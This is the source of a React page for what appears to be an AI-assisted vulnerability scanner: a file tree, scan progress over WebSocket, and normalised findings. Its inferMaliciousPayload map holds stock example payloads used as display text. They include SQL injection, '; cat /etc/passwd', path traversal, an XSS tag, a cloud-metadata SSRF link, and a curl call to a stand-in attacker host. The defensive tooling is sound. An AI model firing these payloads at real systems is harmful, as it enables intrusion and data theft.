import React, { useState, useEffect, useCallback, useMemo, useRef } from 'react';
import { useParams, Link } from 'react-router-dom';
import { motion, AnimatePresence } from 'framer-motion';
import ReactMarkdown from 'react-markdown';
import {
  ArrowLeft, GitBranch, FileCode, AlertTriangle,
  Folder, ChevronRight, ChevronDown,
  Loader2, CheckCircle, Clock, Shield, GitCommit, Scan, Bug,
  Terminal, Cpu, Zap, Database, Code2, Bot, RefreshCw, Copy, Check, Eye,
  File, FileJson, FileText, Image as ImageIcon, Lock, FileCode2
} from 'lucide-react';
import DashboardLayout from '../components/DashboardLayout';
import { Card, CardContent, CardDescription, CardHeader, CardTitle } from '../components/ui/card';
import { Button } from '../components/ui/button';
import { Badge } from '../components/ui/badge';
import { Tabs, TabsContent, TabsList, TabsTrigger } from '../components/ui/tabs';
import { Progress } from '../components/ui/progress';
import { ScrollArea } from '../components/ui/scroll-area';
import {
  Select,
  SelectContent,
  SelectItem,
  SelectTrigger,
  SelectValue
} from '../components/ui/select';
import {
  Dialog,
  DialogContent,
  DialogDescription,
  DialogHeader,
  DialogTitle,
  DialogFooter,
} from '../components/ui/dialog';
import { api } from '../services/api';
import { toast } from 'sonner';
import { getCookie } from '../utils/cookies';
import { useAuthStore } from '../store/authStore';

const UNIFIED_VULN_CATEGORIES = [
  'Injection (SQL/NoSQL/LDAP/Command/Path Traversal)',
  'Broken Access Control (IDOR/BOLA)',
  'Cross-Site Scripting (XSS)',
  'Server-Side Request Forgery (SSRF)',
  'Insecure Deserialization',
  'Hardcoded Secrets / Credentials',
  'Cryptographic Failures',
  'Security Misconfiguration (CORS, Headers)',
  'Insecure Design / Architecture',
  'Business Logic Flaws'
];

const TYPE_TO_CATEGORY = {
  'SQL Injection': 'Injection (SQL/NoSQL/LDAP/Command/Path Traversal)',
  'Command Injection': 'Injection (SQL/NoSQL/LDAP/Command/Path Traversal)',
  'Path Traversal': 'Injection (SQL/NoSQL/LDAP/Command/Path Traversal)',
  'IDOR / Broken Access Control': 'Broken Access Control (IDOR/BOLA)',
  'XSS': 'Cross-Site Scripting (XSS)',
  'SSRF': 'Server-Side Request Forgery (SSRF)',
  'Insecure Deserialization': 'Insecure Deserialization',
  'Hardcoded Secret': 'Hardcoded Secrets / Credentials',
  'Cryptographic Failure': 'Cryptographic Failures',
  'Security Misconfiguration': 'Security Misconfiguration (CORS, Headers)',
  'Business Logic Flaw': 'Business Logic Flaws'
};

const PLACEHOLDER_TEXT_RE = /requires\s+logn|requires\s+login|unknown\s+vulnerability|security\s+issue|no\s+description\s+available/i;
const PLACEHOLDER_PAYLOAD_RE = /^(?:<[^>]*payload[^>]*>|attacker_payload|malicious_payload|malicious_data|user_input|input)$/i;

const normalizeType = (vuln) => {
  const rawType = String(vuln?.type || '').trim();
  if (rawType && TYPE_TO_CATEGORY[rawType]) return rawType;
  if (/xss|cross[-\s]?site/i.test(rawType)) return 'XSS';
  if (/ssrf|server[-\s]?side\s+request\s+forgery/i.test(rawType)) return 'SSRF';
  if (/idor|bola|broken\s+access/i.test(rawType)) return 'IDOR / Broken Access Control';
  if (/hardcoded|secret|credential/i.test(rawType)) return 'Hardcoded Secret';
  if (/crypto|encrypt|cipher|hash/i.test(rawType)) return 'Cryptographic Failure';
  if (/deserializ|xxe|xml[-\s]?external[-\s]?entity/i.test(rawType)) return 'Insecure Deserialization';
  if (/command\s*injection|rce|exec/i.test(rawType)) return 'Command Injection';
  if (/path\s*travers|lfi|directory[-\s]?traversal/i.test(rawType)) return 'Path Traversal';
  if (/sql|sqli|nosql|ldap|xpath/i.test(rawType)) return 'SQL Injection';
  if (/business|logic/i.test(rawType)) return 'Business Logic Flaw';
  return 'Security Misconfiguration';
};

const normalizeCategory = (vuln, normalizedType) => {
  const rawCategory = String(vuln?.category || '').trim();
  if (UNIFIED_VULN_CATEGORIES.includes(rawCategory)) return rawCategory;
  return TYPE_TO_CATEGORY[normalizedType] || 'Insecure Design / Architecture';
};

const normalizeText = (raw, fallback) => {
  const value = String(raw || '').replace(/\\n/g, '\n').trim();
  if (!value || PLACEHOLDER_TEXT_RE.test(value)) return fallback;
  return value;
};

const normalizeCodeSnippet = (raw) => {
  const value = String(raw || '').replace(/\\n/g, '\n').trim();
  if (!value) return '';
  if (/^requires\s+log(?:in|n)$/i.test(value)) return '';
  return value;
};

const normalizePayload = (raw) => {
  if (raw === null || raw === undefined) return '';
  if (typeof raw === 'string') return raw.replace(/\\n/g, '\n').trim();
  try {
    return JSON.stringify(raw, null, 2);
  } catch {
    return String(raw);
  }
};

const inferMaliciousPayload = (vuln) => {
  const type = normalizeType(vuln);
  const map = {
    'SQL Injection': "' OR 1=1 --",
    'Command Injection': '; cat /etc/passwd',
    'Path Traversal': '../../etc/passwd',
    'XSS': '<img src=x onerror=alert(1)>',
    'SSRF': 'http://169.254.169.254/latest/meta-data/',
    'IDOR / Broken Access Control': 'invoice_id=10002',
    'Insecure Deserialization': '{"$type":"System.Windows.Data.ObjectDataProvider"}',
    'Hardcoded Secret': 'AKIAIOSFODNN7EXAMPLE',
    'Cryptographic Failure': '0000000000000000',
    'Security Misconfiguration': 'github.event.issue.title && curl http://attacker.tld/pwn',
    'Business Logic Flaw': 'quantity=-1000',
  };
  return map[type] || '" OR "1"="1';
};

const getEffectivePayload = (vuln) => {
  const payload = normalizePayload(vuln?.malicious_payload);
  if (!payload || PLACEHOLDER_PAYLOAD_RE.test(payload)) {
    return inferMaliciousPayload(vuln);
  }
  return payload;
};

const normalizePayloadFlow = (vuln) => {
  const raw = String(vuln?.exploit_explanation || '').replace(/\\n/g, '\n');
  const cleaned = raw
    .replace(/(?:\*\*)?Exact Affected Lines:(?:\*\*)?\s*`?\[[^\]]*\]`?/gi, '')
    .replace(/\s{2,}/g, ' ')
    .trim();

  if (cleaned && !PLACEHOLDER_TEXT_RE.test(cleaned)) {
    return cleaned;
  }

  const parameter = String(vuln?.vulnerable_parameter || 'user_input').trim();
  const payload = getEffectivePayload(vuln);
  return `Attacker controls ${parameter} and supplies ${payload}. This value reaches the vulnerable sink without strict validation, so it is interpreted as executable syntax instead of inert data.`;
};

const buildGithubLineUrl = (repoFullName, branch, filePath, lineNumber) => {
  if (!repoFullName || !filePath) return '';
  const cleanFile = String(filePath).replace(/^\/+/, '');
  const safeBranch = branch || 'main';
  const linePart = lineNumber ? `#L${lineNumber}` : '';
  return `https://github.com/${repoFullName}/blob/${safeBranch}/${cleanFile}${linePart}`;
};

const buildInjectedExample = (vuln) => {
  const explicit = String(vuln?.exploit_injected_example || '').trim();
  if (explicit) return explicit;
  const fn = String(vuln?.title || vuln?.function_name || 'vulnerableFunction').replace(/\s+/g, '');
  const param = String(vuln?.vulnerable_parameter || 'user_input');
  const payload = getEffectivePayload(vuln);
  return `${fn}(${param}=${payload})`;
};

const MARKDOWN_COMPONENTS = {
  h3: ({ children }) => <h3 className="text-base font-semibold text-foreground mb-2">{children}</h3>,
  p: ({ children }) => <p className="text-sm text-muted-foreground leading-relaxed mb-2">{children}</p>,
  strong: ({ children }) => <strong className="text-foreground font-semibold">{children}</strong>,
  ul: ({ children }) => <ul className="list-disc list-inside space-y-1 text-sm text-muted-foreground mb-2">{children}</ul>,
  ol: ({ children }) => <ol className="list-decimal list-inside space-y-1 text-sm text-muted-foreground mb-2">{children}</ol>,
  li: ({ children }) => <li>{children}</li>,
  code: ({ inline, children }) => {
    if (inline) {
      return <code className="rounded bg-muted px-1 py-0.5 text-xs text-foreground">{children}</code>;
    }
    return <code className="text-xs text-foreground">{children}</code>;
  },
  pre: ({ children }) => <pre className="bg-muted/50 border border-border/70 p-3 rounded-md overflow-x-auto mb-2">{children}</pre>,
};

// File Tree Component with vulnerability indicators
const FileTreeItem = ({ item, level = 0, vulnerabilitiesByFile = {}, onFileClick }) => {
  const [expanded, setExpanded] = useState(level < 2);
  const isFolder = item.type === 'folder';
  const hasChildren = item.children && item.children.length > 0;

  // Get vulnerability count for this item (file or folder)
  const getVulnerabilityCount = (node) => {
    if (node.type === 'folder') {
      // Sum up vulnerabilities in all children
      return (node.children || []).reduce((sum, child) => sum + getVulnerabilityCount(child), 0);
    }
    return (vulnerabilitiesByFile[node.path] || []).length;
  };

  const vulnCount = getVulnerabilityCount(item);
  const fileVulns = !isFolder ? (vulnerabilitiesByFile[item.path] || []) : [];

  const getFileIcon = (path) => {
    const ext = path.split('.').pop().toLowerCase();
    
    switch (ext) {
      case 'js': case 'jsx': case 'ts': case 'tsx':
      case 'py': case 'java': case 'go': case 'rs':
        return <FileCode2 className="w-4 h-4 text-blue-500" />;
      case 'html': case 'css': case 'scss': case 'less':
        return <FileCode className="w-4 h-4 text-pink-500" />;
      case 'json': case 'yaml': case 'yml': case 'toml':
        return <FileJson className="w-4 h-4 text-green-500" />;
      case 'md': case 'txt':
        return <FileText className="w-4 h-4 text-gray-400" />;
      case 'jpg': case 'png': case 'gif': case 'svg':
        return <ImageIcon className="w-4 h-4 text-purple-500" />;
      case 'sh': case 'bash': case 'zsh':
        return <Terminal className="w-4 h-4 text-gray-300" />;
      case 'lock': case 'env':
        return <Lock className="w-4 h-4 text-red-400" />;
      default:
        return <File className="w-4 h-4 text-muted-foreground" />;
    }
  };

  const handleClick = () => {
    if (isFolder) {
      setExpanded(!expanded);
    } else if (fileVulns.length > 0 && onFileClick) {
      onFileClick(item.path, fileVulns);
    }
  };

  return (
    <div>
      <div
        className={`flex items-center gap-2 py-1.5 px-2 rounded hover:bg-muted/50 cursor-pointer transition-colors ${vulnCount > 0 ? 'bg-red-500/5' : ''
          }`}
        style={{ paddingLeft: `${level * 16 + 8}px` }}
        onClick={handleClick}
      >
        {isFolder ? (
          <>
            {hasChildren ? (
              expanded ? (
                <ChevronDown className="w-4 h-4 text-muted-foreground" />
              ) : (
                <ChevronRight className="w-4 h-4 text-muted-foreground" />
              )
            ) : (
              <span className="w-4" />
            )}
            <Folder className={`w-4 h-4 ${vulnCount > 0 ? 'text-red-500' : 'text-yellow-500'}`} />
          </>
        ) : (
          <>
            <span className="w-4" />
            {getFileIcon(item.path)}
          </>
        )}
        <span className={`text-sm truncate ${vulnCount > 0 ? 'font-medium' : ''}`}>{item.name}</span>
        {vulnCount > 0 && (
          <Badge variant="destructive" className="ml-auto text-xs h-5 px-1.5">
            <Bug className="w-3 h-3 mr-1" />
            {vulnCount}
          </Badge>
        )}
        {!isFolder && !vulnCount && item.size && (
          <span className="text-xs text-muted-foreground ml-auto">
            {item.size > 1024 ? `${(item.size / 1024).toFixed(1)}KB` : `${item.size}B`}
          </span>
        )}
      </div>

      <AnimatePresence>
        {isFolder && expanded && hasChildren && (
          <motion.div
            initial={{ height: 0, opacity: 0 }}
            animate={{ height: 'auto', opacity: 1 }}
            exit={{ height: 0, opacity: 0 }}
            transition={{ duration: 0.15 }}
          >
            {item.children.map((child, idx) => (
              <FileTreeItem
                key={child.path || idx}
                item={child}
                level={level + 1}
                vulnerabilitiesByFile={vulnerabilitiesByFile}
                onFileClick={onFileClick}
              />
            ))}
          </motion.div>
        )}
      </AnimatePresence>
    </div>
  );
};

// Build tree structure from flat file list
const buildFileTree = (files) => {
  const root = { children: [] };

  files.forEach(file => {
    const parts = file.path.split('/');
    let current = root;

    parts.forEach((part, index) => {
      const isLast = index === parts.length - 1;
      let child = current.children.find(c => c.name === part);

      if (!child) {
        child = {
          name: part,
          path: parts.slice(0, index + 1).join('/'),
          type: isLast ? file.type : 'folder',
          size: isLast ? file.size : null,
          children: []
        };
        current.children.push(child);
      }

      current = child;
    });
  });

  // Sort: folders first, then files, alphabetically
  const sortChildren = (node) => {
    if (node.children) {
      node.children.sort((a, b) => {
        if (a.type === 'folder' && b.type !== 'folder') return -1;
        if (a.type !== 'folder' && b.type === 'folder') return 1;
        return a.name.localeCompare(b.name);
      });
      node.children.forEach(sortChildren);
    }
  };

  sortChildren(root);
  return root.children;
};

const RepositoryDetail = () => {
  const { id } = useParams();
  const [repo, setRepo] = useState(null);
  const [vulnerabilities, setVulnerabilities] = useState([]);
  const [loading, setLoading] = useState(true);

  // Branch & File Tree state
  const [branches, setBranches] = useState([]);
  const [selectedBranch, setSelectedBranch] = useState('');
  const [defaultBranch, setDefaultBranch] = useState('main');
  const [fileTree, setFileTree] = useState([]);
  const [loadingTree, setLoadingTree] = useState(false);

  // Scanning state
  const [scanning, setScanning] = useState(false);
  const [scanProgress, setScanProgress] = useState(0);
  const [scanStage, setScanStage] = useState('Initializing');
  const [showScanDialog, setShowScanDialog] = useState(false);
  const [scanMode, setScanMode] = useState('full');
  const [scans, setScans] = useState([]);
  const [commits, setCommits] = useState([]);
  const [selectedCommit, setSelectedCommit] = useState('');
  const [estimatedTimeRemaining, setEstimatedTimeRemaining] = useState(null);
  const [activeScanId, setActiveScanId] = useState('');

  // State for file-based vulnerability viewer
  const [selectedFileVulns, setSelectedFileVulns] = useState(null);
  const [selectedFilePath, setSelectedFilePath] = useState('');

  // Debug / AI analysis state
  const [scanDebug, setScanDebug] = useState(null);
  const [scanDebugRuns, setScanDebugRuns] = useState([]);
  const [selectedDebugRunId, setSelectedDebugRunId] = useState('');
  const [loadingDebug, setLoadingDebug] = useState(false);
  const [debugError, setDebugError] = useState(null);
  const [copiedSection, setCopiedSection] = useState(null);
  const [debugInnerTab, setDebugInnerTab] = useState('wrapper');

  const fetchScanDebug = useCallback(async (preferredDebugId = null) => {
    if (!id) return;
    setLoadingDebug(true);
    setDebugError(null);
    try {
      const runs = await api.getAIDebug(id);
      setScanDebugRuns(runs || []);

      if (!runs || runs.length === 0) {
        setScanDebug(null);
        setSelectedDebugRunId('');
        setDebugError('No scan debug data available yet. Run a scan first.');
        return;
      }

      const candidateId = preferredDebugId || selectedDebugRunId || runs[0].id;
      const targetId = runs.some((r) => r.id === candidateId) ? candidateId : runs[0].id;
      const data = await api.getAIDebugById(targetId);
      setScanDebug(data);
      setSelectedDebugRunId(targetId);
    } catch (err) {
      setDebugError(err?.response?.data?.detail || 'No scan debug data available yet. Run a scan first.');
      setScanDebug(null);
    } finally {
      setLoadingDebug(false);
    }
  }, [id, selectedDebugRunId]);

  const handleDebugRunChange = useCallback((runId) => {
    setSelectedDebugRunId(runId);
    fetchScanDebug(runId);
  }, [fetchScanDebug]);

  const copyToClipboard = useCallback((text, section) => {
    navigator.clipboard.writeText(text || '').then(() => {
      setCopiedSection(section);
      setTimeout(() => setCopiedSection(null), 2000);
    });
  }, []);

  const handleTabChange = useCallback((value) => {
    if (value === 'ai-patterns') {
      fetchScanDebug();
    }
  }, [fetchScanDebug]);

  // Group vulnerabilities by file path
  const vulnerabilitiesByFile = useMemo(() => {
    const grouped = {};
    vulnerabilities.forEach(vuln => {
      const filePath = vuln.file_path || 'unknown';
      if (!grouped[filePath]) {
        grouped[filePath] = [];
      }
      grouped[filePath].push(vuln);
    });
    return grouped;
  }, [vulnerabilities]);

  const normalizedVulnerabilities = useMemo(() => {
    return vulnerabilities.map((vuln) => {
      const type = normalizeType(vuln);
      const category = normalizeCategory(vuln, type);
      const payload = getEffectivePayload(vuln);
      const lineLink = buildGithubLineUrl(repo?.full_name, selectedBranch, vuln.file_path, vuln.line_number);
      const affectedLines = Array.isArray(vuln.all_affected_lines)
        ? [...new Set(vuln.all_affected_lines.map((n) => Number(n)).filter((n) => Number.isInteger(n) && n > 0))].sort((a, b) => a - b)
        : (vuln.line_number ? [Number(vuln.line_number)] : []);
      return {
        ...vuln,
        type,
        category,
        title: normalizeText(vuln.title, type),
        description: normalizeText(
          vuln.description,
          `Potential ${type} detected. Review data flow and controls.`
        ),
        reason: normalizeText(
          vuln.reason || vuln.ai_reasoning,
          `Tagged as ${type} based on rule match and code context.`
        ),
        code_snippet: normalizeCodeSnippet(vuln.code_snippet),
        vulnerable_parameter: String(vuln.vulnerable_parameter || '').trim(),
        malicious_payload: payload,
        exploit_explanation: normalizePayloadFlow(vuln),
        exploit_injected_example: String(buildInjectedExample(vuln) || '').replace(/\\n/g, '\n').trim(),
        impact_summary: normalizeText(
          vuln.impact_summary,
          `This ${type} issue may leak sensitive data, allow unauthorized modification/deletion, or degrade service availability.`
        ),
        affected_line_link: lineLink,
        all_affected_lines: affectedLines,
      };
    });
  }, [vulnerabilities, repo?.full_name, selectedBranch]);

  const groupedByFileThenCategory = useMemo(() => {
    const grouped = normalizedVulnerabilities.reduce((acc, vuln) => {
      const file = vuln.file_path || 'unknown-file';
      const category = vuln.category || 'Uncategorized';
      if (!acc[file]) {
        acc[file] = {};
      }
      if (!acc[file][category]) {
        acc[file][category] = [];
      }
      acc[file][category].push(vuln);
      return acc;
    }, {});

    return Object.keys(grouped)
      .sort((a, b) => a.localeCompare(b))
      .map((filePath) => {
        const categories = Object.keys(grouped[filePath])
          .sort((a, b) => {
            const ai = UNIFIED_VULN_CATEGORIES.indexOf(a);
            const bi = UNIFIED_VULN_CATEGORIES.indexOf(b);
            if (ai === -1 && bi === -1) return a.localeCompare(b);
            if (ai === -1) return 1;
            if (bi === -1) return -1;
            return ai - bi;
          })
          .map((category) => ({
            category,
            items: grouped[filePath][category],
          }));

        return {
          filePath,
          categories,
          totalFindings: categories.reduce((sum, c) => sum + c.items.length, 0),
        };
      });
  }, [normalizedVulnerabilities]);

  // Handle file click in tree to show vulnerabilities
  const handleFileVulnClick = useCallback((filePath, vulns) => {
    setSelectedFilePath(filePath);
    setSelectedFileVulns(vulns);
  }, []);

  // Define fetchData first so it can be referenced by handleWebSocketMessage
  const fetchData = useCallback(async (restoreRunningScan = false) => {
    try {
      const [repoData, vulnData, branchData, scanData] = await Promise.all([
        api.getRepository(id),
        api.getVulnerabilities({ repository_id: id }),
        api.getRepoBranches(id).catch(() => ({ branches: [], default_branch: 'main' })),
        api.getRepoScans(id).catch(() => [])
      ]);

      setRepo(repoData);
      setVulnerabilities(vulnData);
      setBranches(branchData.branches || []);
      setDefaultBranch(branchData.default_branch || 'main');
      setSelectedBranch(branchData.default_branch || 'main');
      setScans(scanData);

      // Only restore running scan on initial load, not after scan completion
      if (restoreRunningScan) {
        const runningScan = scanData.find(s => s.status === 'running' || s.status === 'pending');
        if (runningScan) {
          completionHandledRef.current = false;
          setActiveScanId(runningScan.id || '');
          setScanning(true);
          setScanProgress(runningScan.progress || 50);
          setScanStage('Workflow running...');
        } else {
          setActiveScanId('');
        }
      }
    } catch (error) {
      toast.error('Failed to load repository details');
    } finally {
      setLoading(false);
    }
  }, [id]);

  // WebSocket ref for scan-specific connections
  const scanWsRef = useRef(null);
  const pingIntervalRef = useRef(null);
  const completionHandledRef = useRef(false);

  const finalizeScanCompletion = useCallback((message) => {
    if (completionHandledRef.current) return;
    completionHandledRef.current = true;

    setScanProgress(85);
    setScanStage('Results received');

    setTimeout(() => {
      setScanProgress(100);
      setScanStage('Scan completed!');
    }, 500);

    setTimeout(() => {
      setScanning(false);
      setActiveScanId('');
      setScanProgress(0);
      setScanStage('');
      setEstimatedTimeRemaining(null);
      toast.success(message || 'Scan completed!');
      fetchData(false);

      if (scanWsRef.current) {
        scanWsRef.current.close();
      }
    }, 2000);
  }, [fetchData]);

  // Function to connect WebSocket for a specific scan
  const connectScanWebSocket = useCallback((scanId) => {
    const token = getCookie('auth_token');
    if (!token || !scanId) return;

    const backendUrl = process.env.REACT_APP_BACKEND_URL || 'http://localhost:8000';
    const wsProtocol = backendUrl.startsWith('https') ? 'wss' : 'ws';
    const wsHost = backendUrl.replace(/^https?:\/\//, '');
    const wsUrl = `${wsProtocol}://${wsHost}/ws/notifications?token=${token}&scan_id=${scanId}`;

    console.log(`Opening WebSocket for scan ${scanId}`);

    // Close any existing connection
    if (scanWsRef.current) {
      scanWsRef.current.close();
    }

    const ws = new WebSocket(wsUrl);
    scanWsRef.current = ws;

    ws.onopen = () => {
      console.log(`WebSocket connected for scan ${scanId}`);
      // Start ping interval
      pingIntervalRef.current = setInterval(() => {
        if (ws.readyState === WebSocket.OPEN) {
          ws.send(JSON.stringify({ type: 'ping' }));
        }
      }, 30000);
    };

    ws.onmessage = (event) => {
      try {
        const data = JSON.parse(event.data);

        if (data.type === 'pong' || data.type === 'connected') return;

        // Wrapper Hunter completed
        if (data.type === 'wrapper_hunter_complete') {
          console.log('Wrapper hunter completed:', data.message);
          setScanProgress(30);
          setScanStage('Wrapper analysis done');
        }

        // LLM analysis started
        if (data.type === 'llm_analysis_started') {
          console.log('LLM analysis started:', data.message);
          setScanProgress(35);
          setScanStage('AI analyzing wrappers...');
          setEstimatedTimeRemaining(null);
        }

        // LLM chunk progress (emitted after every single chunk, and once after Phase 1)
        if (data.type === 'llm_chunk_progress') {
          const pct = data.total > 0
            ? Math.round(35 + (data.processed / data.total) * 10)
            : 35;
          setScanProgress(Math.min(pct, 44));

          // Only update ETA when we have a real value (null = keep showing "Calculating...")
          const etaSec = data.estimated_seconds_remaining;
          if (etaSec != null) setEstimatedTimeRemaining(etaSec);

          // Preliminary Phase 1→2 transition message (chunk_idx === -1)
          if (data.chunk_idx === -1) {
            setScanStage(data.message || 'AI analysis: phase 1 complete, analysing functions...');
          } else {
            let stageMsg = `AI analysis: ${data.processed}/${data.total} chunks`;
            if (data.failed > 0) stageMsg += ` (${data.failed} failed)`;
            if (data.manual_review > 0) stageMsg += ` (${data.manual_review} need review)`;
            setScanStage(stageMsg);
          }
        }

        // LLM analysis completed
        if (data.type === 'llm_analysis_complete') {
          console.log('LLM analysis complete:', data.message);
          setScanProgress(45);
          setEstimatedTimeRemaining(null);
          let stageMsg = `AI found ${data.custom_rules_count || 0} custom rule(s)`;
          if (data.manual_review_count > 0) {
            stageMsg += ` (${data.manual_review_count} chunk(s) need manual review)`;
          }
          setScanStage(stageMsg);
        }

        // Semgrep scan started
        if (data.type === 'semgrep_started') {
          console.log('Semgrep scan started:', data.message);
          setScanProgress(55);
          setScanStage('Semgrep scanning...');
        }

        // Scan complete (final)
        if (data.type === 'scan_complete') {
          const notification = data.notification || {};
          const notificationData = notification.data || {};

          // Check if this notification is for our current scan
          if (
            notificationData.repository_id === id ||
            notificationData.scan_id === scanId ||
            data.scan_id === scanId
          ) {
            finalizeScanCompletion(notification.message || data.message || 'Scan completed!');
            console.log(`Scan ${scanId} completed, processing final UI state`);
          }
        }
      } catch (error) {
        console.error('WebSocket: Failed to parse message', error);
      }
    };

    ws.onclose = (event) => {
      console.log(`WebSocket closed for scan ${scanId}:`, event.code, event.reason);
      if (pingIntervalRef.current) {
        clearInterval(pingIntervalRef.current);
        pingIntervalRef.current = null;
      }
      scanWsRef.current = null;
    };

    ws.onerror = (error) => {
      console.error(`WebSocket error for scan ${scanId}:`, error);
    };
  }, [id, finalizeScanCompletion]);

  // Reconnect scan-specific socket when restoring an in-progress scan.
  useEffect(() => {
    if (!scanning || !activeScanId) return;
    if (scanWsRef.current && scanWsRef.current.readyState === WebSocket.OPEN) return;
    connectScanWebSocket(activeScanId);
  }, [scanning, activeScanId, connectScanWebSocket]);

  // Poll as a fallback in case the final WebSocket event is missed.
  useEffect(() => {
    if (!scanning || !activeScanId) return;

    const interval = setInterval(async () => {
      try {
        const latestScans = await api.getRepoScans(id).catch(() => []);
        const active = (latestScans || []).find((s) => s.id === activeScanId);
        if (!active) return;

        if (active.status === 'completed') {
          finalizeScanCompletion('Scan completed!');
        } else if (active.status === 'failed') {
          completionHandledRef.current = true;
          setScanning(false);
          setActiveScanId('');
          setScanProgress(0);
          setScanStage('');
          setEstimatedTimeRemaining(null);
          toast.error(active.error || active.error_message || 'Scan failed');
          fetchData(false);
        }
      } catch {
        // Ignore polling hiccups; WebSocket may still deliver completion.
      }
    }, 5000);

    return () => clearInterval(interval);
  }, [scanning, activeScanId, id, finalizeScanCompletion, fetchData]);

  // Cleanup WebSocket on unmount
  useEffect(() => {
    return () => {
      if (scanWsRef.current) {
        scanWsRef.current.close();
      }
      if (pingIntervalRef.current) {
        clearInterval(pingIntervalRef.current);
      }
    };
  }, []);

  // DON'T auto-connect WebSocket based on currentScanId
  // WebSocket is ONLY created when user explicitly starts a scan (in executeScan)

  // Define fetchFileTree and fetchCommits before they're used in useEffect
  const fetchFileTree = useCallback(async (branch) => {
    setLoadingTree(true);
    try {
      const data = await api.getRepoFileTree(id, branch);
      const tree = buildFileTree(data.tree || []);
      setFileTree(tree);
    } catch (error) {
      console.error('Failed to load file tree:', error);
      setFileTree([]);
    } finally {
      setLoadingTree(false);
    }
  }, [id]);

  const fetchCommits = useCallback(async (branch) => {
    try {
      const data = await api.getRepoCommits(id, branch, 20);
      setCommits(data.commits || []);
    } catch (error) {
      console.error('Failed to load commits:', error);
    }
  }, [id]);

  useEffect(() => {
    fetchData(true); // Restore running scan on initial load
  }, [id, fetchData]);

  useEffect(() => {
    if (selectedBranch) {
      fetchFileTree(selectedBranch);
      fetchCommits(selectedBranch);
    }
  }, [selectedBranch, fetchFileTree, fetchCommits]);

  const handleStartScan = async () => {
    // Block scan if user has no Groq API key
    const currentUser = useAuthStore.getState().user;
    if (!currentUser?.has_groq_key) {
      toast.error('Groq API key required. Go to Settings to add your free API key.', {
        action: {
          label: 'Go to Settings',
          onClick: () => window.location.href = '/settings',
        },
      });
      return;
    }

    // Check if this is first scan or rescan
    const hasScannedBefore = scans.length > 0;

    if (hasScannedBefore) {
      setShowScanDialog(true);
    } else {
      // First scan - do full scan directly
      executeScan('full');
    }
  };

  const executeScan = async (mode) => {
    setShowScanDialog(false);
    setScanning(true);
    setScanProgress(10);
    setScanStage('Starting wrapper hunter...');
    setEstimatedTimeRemaining(null);

    try {
      const baseCommit = mode === 'diff' && selectedCommit ? selectedCommit : null;

      const result = await api.startGitHubScan(id, mode, selectedBranch, baseCommit);

      if (result.success) {
        completionHandledRef.current = false;
        setActiveScanId(result.scan_id || '');
        toast.success('Scan pipeline started!');
        setScanProgress(15);
        setScanStage('Wrapper hunter running...');

        // Connect WebSocket immediately for this scan
        connectScanWebSocket(result.scan_id);

        // Add to scans list
        setScans(prev => [{
          id: result.scan_id,
          status: 'running',
          scan_mode: mode,
          branch: selectedBranch,
          started_at: new Date().toISOString(),
          progress: 15
        }, ...prev]);
      }
    } catch (error) {
      setScanning(false);
      setScanProgress(0);
      setScanStage('');
      toast.error(error.response?.data?.detail || 'Failed to start scan');
    }
  };

  const getSeverityColor = (severity) => {
    const colors = {
      critical: 'destructive',
      high: 'destructive',
      medium: 'default',
      low: 'secondary',
      info: 'outline'
    };
    return colors[severity] || 'default';
  };

  const getScanStatusBadge = (status) => {
    const variants = {
      completed: { variant: 'default', icon: CheckCircle, color: 'text-green-500' },
      running: { variant: 'secondary', icon: Loader2, color: 'text-blue-500' },
      pending: { variant: 'outline', icon: Clock, color: 'text-yellow-500' },
      failed: { variant: 'destructive', icon: AlertTriangle, color: 'text-red-500' }
    };

    const config = variants[status] || variants.pending;
    const Icon = config.icon;

    return (
      <Badge variant={config.variant} className="gap-1">
        <Icon className={`w-3 h-3 ${config.color} ${status === 'running' ? 'animate-spin' : ''}`} />
        {status}
      </Badge>
    );
  };

  if (loading) {
    return (
      <DashboardLayout>
        <div className="flex items-center justify-center min-h-[60vh]">
          <div className="animate-spin w-12 h-12 border-4 border-primary border-t-transparent rounded-full" />
        </div>
      </DashboardLayout>
    );
  }

  return (
    <DashboardLayout>
      <div className="space-y-6" data-testid="repository-detail">
        {/* Header */}
        <div>
          <Link to="/repositories" className="inline-flex items-center text-muted-foreground hover:text-primary mb-4">
            <ArrowLeft className="w-4 h-4 mr-2" />
            Back to Repositories
          </Link>
          <div className="flex items-start justify-between">
            <div>
              <h1 className="text-4xl font-bold mb-2">{repo?.name}</h1>
              <p className="text-muted-foreground text-lg">{repo?.full_name}</p>
            </div>
            <div className="flex items-center gap-3">
              <Link to={`/repositories/${id}/demo-visualizer`}>
                <Button variant="outline" className="gap-2 border-border/50 text-foreground hover:text-primary">
                  <Eye className="w-4 h-4" />
                  Visualize
                </Button>
              </Link>
              <Button
                onClick={handleStartScan}
                disabled={scanning}
                className="bg-primary hover:bg-primary/90"
                data-testid="start-scan-button"
              >
                {scanning ? (
                  <>
                    <Loader2 className="w-4 h-4 mr-2 animate-spin" />
                    Scanning...
                  </>
                ) : (
                  <>
                    <Scan className="w-4 h-4 mr-2" />
                    Start Scan
                  </>
                )}
              </Button>
            </div>
          </div>
        </div>

        {/* Scan Progress */}
        <AnimatePresence>
          {scanning && (
            <motion.div
              initial={{ opacity: 0, height: 0 }}
              animate={{ opacity: 1, height: 'auto' }}
              exit={{ opacity: 0, height: 0 }}
              transition={{ duration: 0.3 }}
            >
              <Card className="border-primary/50 bg-gradient-to-br from-primary/5 via-primary/10 to-primary/5">
                <CardContent className="pt-6">
                  <div className="space-y-4">
                    <div className="flex items-start justify-between">
                      <div className="space-y-1">
                        <div className="flex items-center gap-3">
                          <div className="relative">
                            {scanProgress === 100 ? (
                              <CheckCircle className="w-6 h-6 text-green-500" />
                            ) : (
                              <>
                                <Loader2 className="w-6 h-6 animate-spin text-primary" />
                                <div className="absolute inset-0 w-6 h-6 animate-ping text-primary/20">
                                  <Loader2 className="w-6 h-6" />
                                </div>
                              </>
                            )}
                          </div>
                          <span className="font-semibold text-lg">
                            {scanProgress === 100 ? 'Scan Complete' : 'Security Scan in Progress'}
                          </span>
                        </div>
                        <p className="text-sm text-muted-foreground ml-9">
                          {scanStage}
                        </p>
                      </div>
                      <div className="text-right">
                        <div className="text-2xl font-bold text-primary">{scanProgress}%</div>
                        <div className="text-xs text-muted-foreground">Complete</div>
                        {scanProgress >= 35 && scanProgress < 45 && (
                          <div className="text-xs text-muted-foreground mt-1">
                            {estimatedTimeRemaining == null
                              ? 'Calculating...'
                              : estimatedTimeRemaining <= 0
                                ? 'Almost done...'
                                : `~${estimatedTimeRemaining >= 60
